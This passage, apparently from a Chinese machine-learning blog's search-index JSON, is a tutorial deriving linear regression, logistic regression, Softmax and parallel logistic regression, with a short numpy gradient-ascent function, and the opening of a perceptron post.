Xiao的回答","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"},{"name":"Machine Learning tool","slug":"Machine-Learning-tool","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-tool/"}]},{"title":"『我爱机器学习』线性回归、逻辑回归与Softmax","slug":"machine-learning-linear-regression-logistic-regression","date":"2018-03-05T09:08:00.000Z","updated":"2020-10-21T15:38:36.927Z","comments":true,"path":"machine-learning-linear-regression-logistic-regression/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-linear-regression-logistic-regression/","excerpt":"本文介绍： 线性回归 逻辑回归 Softmax 并行化逻辑回归","text":"本文介绍： 线性回归 逻辑回归 Softmax 并行化逻辑回归 线性回归 回归问题举个简单的例子，如预测股票的价格，输出空间y不再是一个标签，而是一个实数集。 对此，线性回归问题的假设是： \\[ f({\\bf x}) = {\\bf w^T x} + b \\] 可以看出和感知机的模型很像，只不过不用取sign，因为最后结果就是个连续的值。 有时为了方便表示，将b吸收进w，而把所有的样本x添加一列为1，成为一个矩阵X： \\[ {\\bf w} = ({\\bf w_{old} },b) \\] \\[ \\rm X = \\begin{bmatrix} x_{11} &amp; x_{12} &amp; \\cdots &amp; x_{1d} &amp; 1 \\\\ x_{21} &amp; x_{22} &amp; \\cdots &amp; x_{2d} &amp; 1 \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ x_{n1} &amp; x_{n2} &amp; \\cdots &amp; x_{nd} &amp; 1 \\\\ \\end{bmatrix} \\] 于是得到： \\[ f({\\bf x}) = \\rm X{\\bf w} \\] 设样本数为n，特征数为d，则维度为： \\(\\rm X\\): n * (d + 1) \\({\\bf y}\\): n * 1 \\({\\bf w}\\): (d + 1) * 1 优化目标 在回归问题中，均方误差是常见的性能度量，公式如下： \\[ {\\rm err}(f({\\bf x}), y) = (f({\\bf x}) - y)^2 \\] 均方误差对应了常见的欧几里得距离，基于均方误差最小化来进行模型求解的方法称为最小二乘法。 线性回归便是用均方误差作为损失函数， \\[ \\begin{align*} L({\\bf w}) &amp; = (f({\\bf x}) - {\\bf y})^2 \\\\ &amp; = (\\rm X{\\bf w} - {\\bf y})^T (\\rm X{\\bf w} - {\\bf y}) \\end{align*} \\] 其实也就是找一个w使得损失函数最小： \\[ {\\bf w}^* = \\rm{arg min_{\\bf w} } (X{\\bf w} - {\\bf y})^T (X{\\bf w} - {\\bf y}) \\] 求解 对w求导得： \\[ \\frac{\\partial L({\\bf w})}{\\partial {\\bf w} } = 2\\rm X^T(\\rm X{\\bf w} - {\\bf y}) \\] 若\\(\\rm X^TX\\)是可逆的，令导数为0便得到： \\[ {\\bf w}^* = ({\\rm X^TX})^{-1}{\\rm X^T}{\\bf y} \\] 通常有特征数d &lt;&lt; 样本数m，使得\\(\\rm X^TX\\)满秩，有唯一解。 但是也有许多情况m &lt; d,这样\\(\\rm X^TX\\)不是满秩的，会有多组解。此时可以解出多个w，都能使均方误差最小化。选择哪一解作为输出将由学习算法归纳偏好决定。 实际求解过程中，一般都直接求解\\(\\rm (X^TX)^{−1}X^T\\) ，\\(\\rm (X^TX)^{−1}X^T\\)称为\\(\\rm X\\)的伪逆，记作\\({\\rm X}^\\dagger\\)。 求解出伪逆后，线性回归模型为： \\[ f({\\bf x}) = \\rm X (X^\\dagger {\\bf y}) \\] 空间变换 线性回归可以进行输出空间的变换。 比如当我们觉得样本的是在指数尺度上变化，我们可以加个指数的变换使得\\(f({\\bf x})\\)接近y \\[ f({\\bf x}) = e^{ {\\bf w^Tx}+b} \\] 也就是求解： \\[ \\ln y = {\\bf w^T x }+b \\] 便得到了对数线性回归，如图（图来自周志华的《机器学习》）： Logistic-curve 这里对数函数起到了将线性回归模型的预测值与真实值联系起来的作用。 更一般的，考虑单调可谓函数g，令： \\[ y = g^{-1}({\\bf w^Tx}+b) \\] 这样的模型称为”广义线性模型“。g称为联系函数，显然对数线性回归是g = ln时的特例。 逻辑回归 现在来讲讲逻辑回归（Logistic Regression），虽然它的名字叫“回归”，但其实它用于分类任务。 在二分类问题中，我们的训练数据集是 \\(T = \\{(x_1,y_1), \\cdots,(x_n,y_n)\\}\\) ，其中\\(y_i \\in \\{-1, +1\\}\\)。训练数据的标签是-1和+1，那么我们预测也是输出+1或者-1标签。但是有时候我们想知道的是概率，即为正例或负例的概率是多少。比如用于医院的任务中，给定一个病人，预测其是否得某种病a。不仅是关心ta是否得病，还关心得病的概率是多少。这个问题与原来的二分类问题有所差别，被称作“软二元分类”问题。求解此问题得到的值越高，说明越有可能是得病a的，否则越有可能是不得病a的。此时目标函数会变化成\\(f({\\bf x})=P(+1|{\\bf x})∈[0,1]\\)的形式 和之前一样，我们仍可以假设计算加权分数，即 \\[ z = \\sum_{j=0}^d w_jx_j = {\\bf w^Tx} \\] 然后，将该分数缩放到[0, 1]这个区间。而缩放操作通常使用Logistic函数来完成，因此这个问题称为Logistic回归问题，假设也被称为Logistic假设。 Logistic函数与逻辑回归模型 现在介绍神奇的Logistic函数 \\[ \\sigma(z)= \\frac{e^{\\bf z} }{1+e^{\\bf z} } = \\frac{1}{1+e^{-{\\bf z} }} \\] 画出二维的图： Logistic-curve 从上图可以看出，对数几率函数是一种Sigmoid函数(即形似s的函数)，它将z值转化为接近0或1的y值。 将上面的假设带入Logistic函数，便得到我们的逻辑回归模型，这里设为\\(h({\\bf x})\\) : \\[ h({\\bf x}) = \\sigma({\\bf w^Tx}) = \\frac{1}{1+e^{-({\\bf w^Tx})} } \\tag{2-1} \\] 按照上面的说法，我们进行了”映射“，这就是输出为正例的概率，因此 \\[ \\begin{align} p(Y = 1 | {\\bf x}) &amp;= h({\\bf x}) = \\frac{1}{1+e^{-{\\bf w^Tx} }} \\\\ p(Y = 0 | {\\bf x}) &amp;= 1-P(Y = 1|{\\bf x}) \\\\ &amp;= \\frac{1}{1+e^{ {\\bf w^Tx} }} \\\\ \\end{align} \\] 现在可以讨论Logistic函数的特点了，一个事件的几率(odds) 是该事件发生的概率与该事件不发生概率的比值，如果事件发生的概率为p，那么该事件的几率是\\(\\frac{p}{1-p}\\)，该事件的对数几率（就是取对数）是： \\[ \\ln \\frac{p}{1-p} \\] 对于逻辑回归而言： \\[ \\ln \\frac{P(Y = 1|{\\bf x}) }{1-P(Y = 1|{\\bf x}) } = \\ln \\frac{\\frac{e^{\\bf w^Tx} }{1+e^{\\bf w^Tx} }}{\\frac{1}{1+e^{\\bf w^Tx} }} = {\\bf w^Tx} \\] 因此可以看出，实际上我们的逻辑回归模型是用线性回归模型的预测结果去逼近真实标记的对数几率。 因此，我们用Logistic函数，并使用了线性函数\\(\\bf w^Tx\\)完成了实数域到输出区间[0,1]（概率值）的转化。 参数估计与损失函数 那么，如何确定逻辑回归模型中的w呢？我们可以使用极大似然法（maximum likelihood method）估计模型参数w。 写出似然函数为： \\[ \\prod_{i=1}^N h({\\bf x_i})^{y_i} (1- h({\\bf x_i}))^{1-y_i}\\\\ \\] 取对数似然为： \\[ \\sum_{i=1}^N [y_i\\ln h({\\bf x_i}) + (1-y_i)\\ln(1- h({\\bf x_i}))] \\] 求上式的最大值即可得到w的估计值。但实际中，我们一般喜欢优化极小值，因此取个负号，得到我们逻辑回归的损失函数： \\[ L(w) = -\\sum_{i=1}^N [y_i\\ln h({\\bf x_i}) + (1-y_i)\\ln(1- h({\\bf x_i}))]\\tag{2-2} \\] 梯度下降求解 式2-2给出了损失函数L(w)，该函数是关于w的高阶可导连续凸函数，可以用梯度下降法、牛顿法求解。 下面使用最常用的梯度下降法。 为了方便的求解偏导，首先计算sigmoid函数的导数\\(\\sigma(z) = \\frac{1}{1+e^{-z} }\\)的偏导： \\[ \\begin{align*} \\frac{\\partial \\sigma}{\\partial z} &amp;= -\\left(\\frac{1}{1+e^{-z} }\\right)^2 \\frac{\\partial e^{-z} }{\\partial z}\\\\ &amp;= -\\left(\\frac{1}{1+e^{-z} }\\right)^2 e^{-z} (-1)\\\\ &amp;= \\sigma(z) \\left(\\frac{ e^{-z} }{1+e^{-z} }\\right) \\\\ &amp;=\\sigma(z)(1 - \\sigma(z)) \\end{align*} \\] 对于\\(h({\\bf x_i})\\)对\\(w_j\\)的偏导则为： \\[ \\begin{align*} \\frac{\\partial h({\\bf x_i})}{\\partial w_j} &amp;= -\\left(\\frac{1}{1+e^{-z} }\\right)^2 \\frac{\\partial e^{-z} }{\\partial z}\\frac{\\partial z}{\\partial w_j}\\\\ &amp;=\\sigma(z)(1 - \\sigma(z)) x_{ij} \\\\ &amp;= h({\\bf x_i})(1-h({\\bf x_i}))x_{ij} \\end{align*} \\] 求完前面，现在可以容易求L(w)对\\(w_j\\)求偏导啦： \\[ \\begin{align*} \\frac{\\partial L(\\bf w)}{\\partial w_j} &amp;= -\\sum_{i=1}^N [y_i(1-h({\\bf x_i}))x_{ij} - (1-y_i)h({\\bf x_i})x_{ij}]\\\\ &amp;= \\sum_{i=1}^N[-y_ix_{ij} + h({\\bf x_i})x_{ij}] \\\\ &amp;= \\sum_{i=1}^N \\left(h({\\bf x_i}) -y_i \\right)x_{ij} \\end{align*} \\] 于是，w的更新公式为： \\[ w_j = w_j - \\eta\\sum_{i=1}^N(h({\\bf x_i}) -y_i )x_{ij}\\tag{2-3} \\] 注意上述的更新公式有连加符号，在python的实现中，如果用for是非常慢的，我们希望能向量化上述式子，从而使用Numpy来加速过程。 查了半天资料，基本没个详细的，自己推吧。 那么，怎么加速呢？ 分析公式2-3，我们发现\\(w_j\\)更新是\\(w_j\\)减去步长 乘上 每个训练数据的\\(h({\\bf x_i})-y_i\\)并乘上对应的\\(\\bf x_i\\)的j维。 如何消去累加? 联想到向量乘法或者矩阵乘法就是有累加的过程！ 本文最开始的时候讲过： \\[ \\rm X = \\begin{bmatrix} x_{11} &amp; x_{12} &amp; \\cdots &amp; x_{1d} &amp; 1 \\\\ x_{21} &amp; x_{22} &amp; \\cdots &amp; x_{2d} &amp; 1 \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ x_{n1} &amp; x_{n2} &amp; \\cdots &amp; x_{nd} &amp; 1 \\\\ \\end{bmatrix} \\] 维度如下： X: N * (d + 1) \\({\\bf y}\\): N * 1 \\({\\bf w}\\): (d + 1) * 1 我们可以构造矩阵 \\[ \\begin{align} X^T(h(x) - y) &amp;= \\begin{bmatrix} x_{11} &amp; x_{12} &amp; \\cdots &amp; x_{1d} &amp; 1 \\\\ x_{21} &amp; x_{22} &amp; \\cdots &amp; x_{2d} &amp; 1 \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\ x_{n1} &amp; x_{n2} &amp; \\cdots &amp; x_{nd} &amp; 1 \\\\ \\end{bmatrix} ^T \\begin{bmatrix}h(x_1) - y_1 \\\\h(x_2) - y_2 \\\\ \\vdots \\\\h(x_n) - y_n \\\\\\end{bmatrix} \\\\&amp; = \\begin{bmatrix} x_{11} &amp; x_{21} &amp; \\cdots &amp; x_{n1} \\\\ x_{12} &amp; x_{22} &amp; \\cdots &amp; x_{n2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ x_{1d} &amp; x_{2d} &amp; \\cdots &amp; x_{nd} \\\\ 1 &amp; 1 &amp; \\cdots &amp;1 \\\\ \\end{bmatrix} \\begin{bmatrix}h(x_1) - y_1 \\\\h(x_2) - y_2 \\\\ \\vdots \\\\h(x_n) - y_n \\\\\\end{bmatrix} \\\\&amp;= \\begin{bmatrix} x_{11} &amp; x_{21} &amp; \\cdots &amp; x_{n1} \\\\ x_{12} &amp; x_{22} &amp; \\cdots &amp; x_{n2} \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ x_{1d} &amp; x_{2d} &amp; \\cdots &amp; x_{nd} \\\\ x_{1(d+1)} &amp; x_{2(d+1)} &amp; \\cdots &amp; x_{n(d+1)} \\\\ \\end{bmatrix} \\begin{bmatrix}h(x_1) - y_1 \\\\h(x_2) - y_2 \\\\ \\vdots \\\\h(x_n) - y_n \\\\\\end{bmatrix} \\\\&amp;= \\begin{bmatrix} \\sum_{i=1}^n(h(x_i)-y_i) x_{i1} \\\\ \\sum_{i=1}^n(h(x_i)-y_i) x_{i2} \\\\ \\vdots \\\\ \\sum_{i=1}^n(h(x_i)-y_i) x_{id} \\\\ \\sum_{i=1}^n(h(x_i)-y_i) x_{i(d+1)} \\\\ \\end{bmatrix} \\end{align} \\] 推导到这很明显了吧？ 还不明显，那么继续： \\[ \\begin{align} {\\bf w} &amp;= {\\bf w}- \\eta {\\rm X^T}(h({\\bf x}) - {\\bf y}) \\\\&amp; = \\begin{bmatrix} w_1 \\\\ w_2 \\\\ \\vdots\\\\ w_d\\\\ w_{d+1} \\end{bmatrix}-\\eta \\begin{bmatrix} \\sum_{i=1}^n(h(x_i)-y_i) x_{i1} \\\\ \\sum_{i=1}^n(h(x_i)-y_i) x_{i2} \\\\ \\vdots \\\\ \\sum_{i=1}^n(h(x_i)-y_i) x_{id} \\\\ \\sum_{i=1}^n(h(x_i)-y_i) x_{i(d+1)} \\\\ \\end{bmatrix} \\\\&amp; = \\begin{bmatrix} w_1 - \\eta\\sum_{i=1}^n(h(x_i)-y_i) x_{i1} \\\\ w_2- \\eta\\sum_{i=1}^n(h(x_i)-y_i) x_{i2} \\\\ \\vdots \\\\ w_d - \\eta\\sum_{i=1}^n(h(x_i)-y_i) x_{id} \\\\ w_{d+1} - \\eta \\sum_{i=1}^n(h(x_i)-y_i) x_{i(d+1)} \\\\ \\end{bmatrix} \\tag{2-4} \\end{align} \\] 看到这里就懂了吧？ 式2-4是2-3等价的矩阵表示。 因此我们可以用式2-4来写程序~ 这也是《机器学习实战》中倒数第二行式子的由来： 123456789101112def gradAscent(dataMatIn, classLabels): dataMatrix = np.mat(dataMatIn) labelMat = np.mat(classLabels).transpose() m, n = np.shape(dataMatrix) alpha = 0.001 maxCycles = 500 weights = np.ones((n,1)) for k in range(maxCycles): h = sigmoid(dataMatrix * weights) error = labelMat - h weights = weights + alpha * dataMatrix.transpose() * error return weights.getA() 另一种似然函数 在上面推导损失函数2-2的时候，我们y的标签为{0，1}，如果我们我们假设标签为{-1, +1}，那么同样用极大似然估计，会得到很多材料上的另一种类似的似然函数。 推导如下： \\[ \\begin{align} p(Y = +1 | {\\bf x}) &amp;= h({\\bf x}) = \\frac{1}{1+e^{-{\\bf w^Tx} }} \\\\ p(Y = -1 | {\\bf x}) &amp;= 1-P(Y = 1|{\\bf x}) \\\\ &amp;= \\frac{1}{1+e^{ {\\bf w^Tx} }} \\end{align} \\] 由于sigmoid有性质\\(h(-x) = 1 - h(x)\\)，因此上面两式可以合并为： \\[ p(y |{\\bf x}) = h(y{\\bf x}) = \\frac{1}{1+e^{-y{\\bf w^Tx} }} \\] 写出似然函数为： \\[ \\begin{align*} \\prod_{i=1}^n p(y_i |{\\bf x_i}) &amp;= \\prod_{i=1}^n h(y_i{\\bf x_i}) \\\\ &amp;=\\prod_{i=1}^n\\frac{1}{1+e^{-y_i{\\bf w^Tx_i} }} \\end{align*} \\] 取对数似然有： \\[ \\sum_{i=1}^n \\ln\\frac{1}{1+e^{-y_i{\\bf w^Tx_i} }} = -\\sum_{i=1}^n \\ln(1+e^{-y_i{\\bf w^Tx_i} }) \\] 取负值就得到另一种损失函数 \\[ L(w) =\\sum_{i=1}^n\\ln(1+e^{-y_i{\\bf w^Tx_i} })\\tag{2-5} \\] Softmax 逻辑回归是处理二分类的问题，我们可以将它推广到多分类的情况，就是Softmax： \\[ h({\\bf x}) = \\left[ \\begin{aligned}z_1 \\\\z_2 \\\\ ...\\\\z_K \\end{aligned}\\right]=\\frac{1}{\\sum_{j=1}^Ke^{\\bf w_j^Tx} }\\left[ \\begin{aligned}e^{\\bf w_1^Tx} \\\\e^{\\bf w_2^Tx} \\\\ ...\\\\e^{\\bf w_K^Tx} \\end{aligned}\\right]\\tag{3-1} \\] 看上去仿佛很复杂，因为它输出的是一个向量，向量中每一项分别表示对应类别的概率。而对于每个类别都有一个\\(w_k\\) 假如说求解第k个类别的概率，那么输出就是一个实数： \\[ P(y=k|\\ {\\bf x,w}) = h_k({\\bf x}) =\\frac{e^{\\bf w_k^Tx} }{\\sum_{j=1}^Ke^{\\bf w_j^Tx} }\\tag{3-2} \\] 这里的数据集形式为：\\(\\{ {(\\bf x_1, y_1}), ({\\bf x_2, y_2}), \\cdots, ({\\bf x_N, y_N}) \\}\\) 这里\\(\\bf x\\)是一个D * 1的向量（D为特征数）。而\\({\\bf y_i}\\)则是一个只有一个数字为1，其余都是0的K * 1维向量，用来表示这个样本属于哪个类别。 Softmax学习 和逻辑回归一样，采用极大似然估计。对于单个服从多项分布的单个样本，其似然函数为： \\[ \\prod_{k=1}^K h_k^{y_k},\\\\ 其中，h_k = h_k({\\bf x})=\\frac{e^{\\bf w_k^Tx} }{\\sum_{j=1}^Ke^{\\bf w_j^Tx} } \\] 老样子，我们采用对数似然，并取相反数得： \\[ L({\\bf W}) = -\\sum_{k=1}^K y_k\\ln h_k\\tag{3-3} \\] 3-3也被称为交叉熵损失（cross entropy loss）。注意这里的符号是大写加粗的\\(\\bf W\\)，表示为一个矩阵，形式为\\(\\bf [w_1, w_2,\\cdots,w_K]\\),每个类别都有一个d维的参数\\(w_k\\)，合起来就是d * K。 要优化3-2，可以用梯度下降的方法进行求导。 为了简单起见，我们先让\\(h_k\\)对\\(\\bf w_j\\)求偏导,求导需要注意有\\(j=k\\)和\\(j \\ne k\\)两种情况，需要分开计算。 对于\\(j=k\\)的情况，有: \\[ \\begin{align*} \\frac{\\partial h_k}{\\partial \\bf w_j} &amp;= \\frac{e^{\\bf w_k^Tx} }{\\sum_{a=1}^Ke^{\\bf w_a^Tx} } {\\bf x} - \\frac{e^{\\bf w_k^Tx} }{(\\sum_{a=1}^Ke^{\\bf w_a^Tx})^2} e^{\\bf w_j^Tx} {\\bf x}\\\\ &amp;=h_k (1 - h_j){\\bf x} \\\\ &amp;=h_j (1 - h_j){\\bf x} \\tag{3-4} \\end{align*} \\] 对于\\(j \\ne k\\)的求导，有: \\[ \\begin{align*} \\frac{\\partial h_k}{\\partial \\bf w_j} &amp;= - \\frac{e^{\\bf w_k^Tx} }{(\\sum_{a=1}^Ke^{\\bf w_a^Tx})^2} e^{\\bf w_j^Tx} {\\bf x}\\\\ &amp;=-h_k h_j{\\bf x}\\tag{3-5} \\end{align*} \\] 于是，我们现在就可以求3-3 单个样本的交叉熵的导数了： \\[ \\begin{align*} \\frac{\\partial L({\\bf W})}{\\partial \\bf w_j} &amp; = -\\sum_{k} y_k \\frac{\\partial \\log h_k}{\\partial \\bf w_j}\\\\ &amp;= -\\sum_{k} y_k \\frac{1}{h_k}\\frac{\\partial h_k}{\\partial \\bf w_j}\\\\ &amp;= -y_j \\frac{1}{h_j}h_j (1 - h_j){\\bf x} + \\sum_{k\\ne j}y_k \\frac{1}{h_k}h_kh_j{\\bf x}\\\\ &amp;=- y_j (1 - h_j){\\bf x} + \\sum_{k\\ne j}y_k h_j{\\bf x}\\\\ &amp;= \\left(-y_j +y_jh_j+ \\sum_{k\\ne j}y_kh_j\\right) {\\bf x}\\\\ &amp;= \\left(-y_j +\\sum_{k}y_kh_j\\right) {\\bf x} \\\\ &amp;= \\left(-y_j +h_j\\sum_{k}y_k\\right) {\\bf x} \\\\ &amp;= \\left(h_j -y_j\\right) {\\bf x} \\\\ \\end{align*} \\] 进一步的，如果要计算整个训练集的损失，可以求： \\[ L({\\bf W}) = -\\sum_{i=1}^N\\sum_{i=1}^K y_k\\ln h_k({\\bf x_i})\\tag{3-4} \\] 参数的冗余性 Softmax 回归有一个不寻常的特点：它有一个“冗余”的参数集。 比如说，我们对每个类别参数\\(\\bf w_k\\)都减去一个向量\\(\\theta\\)，得： \\[ \\begin{align*} P(y=k|\\ {\\bf x,w}) = h_k({\\bf x}) &amp;=\\frac{e^{\\bf (w_k - \\theta)^Tx} }{\\sum_{j=1}^Ke^{\\bf (w_j- \\theta)^Tx} }\\\\ &amp;=\\frac{e^{\\bf w_k ^Tx} e^{\\bf - \\theta^Tx} }{\\sum_{j=1}^Ke^{\\bf w_j^Tx}e^{\\bf - \\theta^Tx} }\\\\ &amp;=\\frac{e^{\\bf w_k^Tx} }{\\sum_{j=1}^Ke^{\\bf w_j^Tx} } \\end{align*} \\] 可以看到减去一个向量完全不影响预测结果！这说明如果参数\\(\\bf (w_1, w_2,\\cdots , w_k)\\)是已经根据损失函数求解后的极小值点，那么\\(\\bf (w_1 - \\theta, w_2 - \\theta,\\cdots , w_k - \\theta)\\)同样也是极小值点。因此解不唯一。 解决这个问题可以加入权重衰减（weight decay），说白了就是加入L2正则项。 3-4就变为： \\[ L({\\bf W}) = -\\sum_{i=1}^N\\sum_{k=1}^K y_k\\ln h_k({\\bf x_i}) + \\sum_{i=1}^d \\sum_{k=1}^Kw_{ij}^2 \\tag{3-4} \\] 和逻辑回归的关系 当k = 2时，Softmax表达式为： \\[ h({\\bf x}) = \\frac{1}{e^{\\bf w_1^Tx}+e^{\\bf w_2^Tx} }\\left[ \\begin{aligned}e^{\\bf w_1^Tx} \\\\e^{\\bf w_2^Tx} \\end{aligned}\\right] \\] 利用冗余性的特点，参数都减去\\(w_1\\)，得： \\[ \\begin{align*} h({\\bf x}) &amp;= \\frac{1}{e^{\\bf (w_1 - w_1)^Tx}+e^{\\bf (w_2 - w_1)^Tx} }\\left[ \\begin{aligned}e^{\\bf (w_1 - w_1)^Tx} \\\\e^{\\bf (w_2 - w_1)^Tx} \\end{aligned}\\right]\\\\ &amp;= \\frac{1}{1+e^{\\bf (w_2 - w_1)^Tx} }\\left[ \\begin{aligned} 1 \\\\e^{\\bf (w_2 - w_1)^Tx} \\end{aligned}\\right] \\\\ &amp;= \\left[ \\begin{aligned} \\frac{1}{1+e^{\\bf (w_2 - w_1)^Tx} } \\\\ \\frac{e^{\\bf (w_2 - w_1)^Tx} }{1+e^{\\bf (w_2 - w_1)^Tx} } \\end{aligned}\\right] \\\\ &amp;= \\left[ \\begin{aligned} \\frac{1}{1+e^{\\bf (w_2 - w_1)^Tx} } \\\\ 1 -\\frac{1}{1+e^{\\bf (w_2 - w_1)^Tx} } \\end{aligned}\\right] \\\\ \\end{align*} \\] 令\\(\\bf w = w_2 - w_1\\)，得一个类别的概率为\\(\\frac{1}{1+e^{\\bf w^Tx} }\\)，另一个类别的概率为\\(1 - \\frac{1}{1+e^{\\bf w^Tx} }\\)，这和逻辑回归是一样的。 因此，可以说Softmax是Logistic 回归的一般形式，当K=2时，Softmax退化为logistic回归。 使用Softmax 还是K个逻辑回归 如果你在开发一个音乐分类的应用，需要对k种类型的音乐进行识别，那么是选择使用 Softmax 分类器呢，还是使用 logistic 回归算法建立 k 个独立的二元分类器呢？ 如果你的类别是互斥的，那么用Softmax，否则用K个逻辑回归： 这一选择取决于你的类别之间是否互斥，例如，如果你有四个类别的音乐，分别为：古典音乐、乡村音乐、摇滚乐和爵士乐，那么你可以假设每个训练样本只会被打上一个标签（即：一首歌只能属于这四种音乐类型的其中一种），此时你应该使用类别数 k = 4 的Softmax回归。（如果在你的数据集中，有的歌曲不属于以上四类的其中任何一类，那么你可以添加一个“其他类”，并将类别数 k 设为5。） 如果你的四个类别如下：人声音乐、舞曲、影视原声、流行歌曲，那么这些类别之间并不是互斥的。例如：一首歌曲可以来源于影视原声，同时也包含人声 。这种情况下，使用4个二分类的 logistic 回归分类器更为合适。这样，对于每个新的音乐作品，我们的算法可以分别判断它是否属于各个类别。 现在我们来看一个计算视觉领域的例子，你的任务是将图像分到三个不同类别中。 假设这三个类别分别是：室内场景、户外城区场景、户外荒野场景。你会使用Softmax回归还是 3个logistic 回归分类器呢？ 现在假设这三个类别分别是室内场景、黑白图片、包含人物的图片，你又会选择 Softmax回归还是多个 logistic 回归分类器呢？ 在第一个例子中，三个类别是互斥的，因此更适于选择Softmax回归分类器 。而在第二个例子中，建立三个独立的 logistic回归分类器更加合适。 并行化逻辑回归 逻辑回归虽然简单，但是在真实环境中，数据量大，也往往对其做并行化处理。 这里，我们首先要复习一下逻辑回归的更新公式2-3： \\[ w_j = w_j - \\eta\\sum_{i=1}^N(h({\\bf x_i}) -y_i )x_{ij}\\\\ 其中，h({\\bf x_i}) = \\frac{1}{1+e^{-({\\bf w^Tx_i})} } \\] 注意到\\(\\bf w\\)的维度为d，需要对数据的每一维都使用上式更新。可以看到，一次更新的开销数据量N以及维度d有关。 数据并行 这是最简单也是最容易想到的数据并行方式了，假设有a台机器，则把数据随机分到a台机器上，每台机器数据不重复，这样每台机器有N/a条样本，每个样本有d个特征。每台机器分别对其样本计算\\((h({\\bf x_i}) -y_i )x_{ij}\\)，最后求和合并即可。 这个方式解决了数据量大的问题，但是实际中特征数量可能很高。 特征并行 特征并行就是对特征进行划分，假设有b台机器，那么，每台机器的有\\(\\frac{d}{b}\\)个特征，N个样本，每台机器对其拥有的特征j分别计算\\((h({\\bf x_i}) -y_i )x_{ij}\\)，然后和其它机器同步更新后的参数即可。 数据+特征并行 数据+特征并行就是上面两种的结合，如下图所示，将数据分为a * b块，其中，即将数据按水平划分，又在特征上垂直划分。 lr-data-feature-parallel 看看公式2-3，我们需要计算\\(\\bf w^Tx\\)，因此，我们可以对所有机器分别计算\\(\\sum_{j} w_jx_{ij}\\)，然后按照行号相同的进行归并，就得到了\\(\\bf w^Tx_i\\)。 此外，我们需要计算\\(\\sum_{i=1}^N(h({\\bf x_i}) -y_i )x_{ij}\\)，这就是要让列号相同的结点进行归并。 Google DistBelief Google实现了一个名为DistBelief的框架，采用parameter server来同步参数，如下图： Google-DistBelief 将训练数据划分为若干个子集，并在每一个子集上运行一个单独的模型副本，各模型副本通过参数服务器来交换梯度信息，参数服务器用来维护模型参数当前的状态，它也分布在多台机器上（假如有10台机器，那么每台机器将负责存储和更新1/10的模型参数，因此，每个模型副本只需要和parameters中和该结点有关的模型参数那部分结点进行通信）。 可以看出，这里面有两种异步性： 模型副本之间的运行是独立的 参数服务器之间的机器也是独立的 如果每个模型副本处理完一个样本就和参数服务器进行通信，那么通信量会很大，为了减少通信的开销，设置了两个参数：\\(n_{fetch}\\)和\\(n_{push}\\)，每\\(n_{fetch}\\)向服务器取一次参数，每\\(n_{push}\\)次向服务器推送结果，\\(n_{fetch}\\)不一定等于\\(n_{push}\\) 此外， 一个Model replicas失效并不影响其它的Model replicas，因此鲁棒性很强 Model replicas是异步执行的，省去了同步时间 每个 Model Replicas 中的 fetch compute push 操作是通过三个线程完成的，类似于流水线机制，大大加快了速度 参数服务器的每个节点更新参数的次数不一定相同，有一定的随机性 然而，这样的异步处理方式使得模型具有很大的随机性，主要体现在一个模型计算样本的梯度的时候，采用的是一组稍微过时的参数，因为它在计算梯度时，其它副本很可能已经对参数服务器中的参数进行了更新；并且某一个时刻，各个机器上的参数更新次数和更新顺序不一定相同。这样的做法缺乏理论基础，但最后得到的模型效果还是不错的。 参考资料 《机器学习》 周志华 《统计学习方法》 - 李航 机器学习基石 - 林轩田 机器学习--Logistic回归计算过程的推导 http://blog.csdn.net/ligang_csdn/article/details/53838743 http://blog.csdn.net/jediael_lu/article/details/77852060 Softmax Softmax回归 Logistic 与 softmax https://deepnotes.io/softmax-crossentropy 并行化逻辑回归 并行逻辑回归 DistBelief 框架下的并行随机梯度下降法 - Downpour SGD","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』感知机","slug":"machine-learning-perceptron","date":"2018-02-28T08:18:41.000Z","updated":"2020-10-21T15:40:10.545Z","comments":true,"path":"machine-learning-perceptron/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-perceptron/","excerpt":"感知机（Perceptron）是一个二分类的线性模型。它于1957年被提出，是支持向量机和神经网络的基础。","text":"感知机（Perceptron）是一个二分类的线性模型。它于1957年被提出，是支持向量机和神经网络的基础。 感知机 感知机（Perceptron）是一个二分类的线性模型。它于1957年被提出，是支持向量机和神经网络的基础。 感知机模型 模型输入数据为：\\(\\{({\\bf x_1}, y_1),({\\bf x_2}, y_2),\\cdots,({\\bf x_n}, y_n) \\}\\)，其中\\(x_i\\)为样本 i 的特征向量，\\(y_i\\in \\{+1,-1\\}\\)为类别标签。 输入到输出空间的映射为： \\[ f(x) = {\\rm sign}({\\bf w^Tx}+b) \\] 上述的sign为符号函数，其值如下： \\[ {\\rm sign}(t) = \\begin{cases} +1 , &amp; t\\ge 0 \\\\ -1, &amp; t\\lt 0 \\end{cases} \\] 感知机的几何解释 感知机的目标是求一个超平面使得特征空间划分为两部分，从而实现分类的效果。 线性方程 \\({\\bf w^T x}+b = 0\\)，w为超平面的法向量，b是超平面的截距。 w为啥是法向量？证明如下： 设\\({\\bf x_0,x_1}\\)是平面上的任意两个点，则显然有： \\[ \\begin{align} {\\bf w^T x_0} + b = 0\\\\ {\\bf w^T 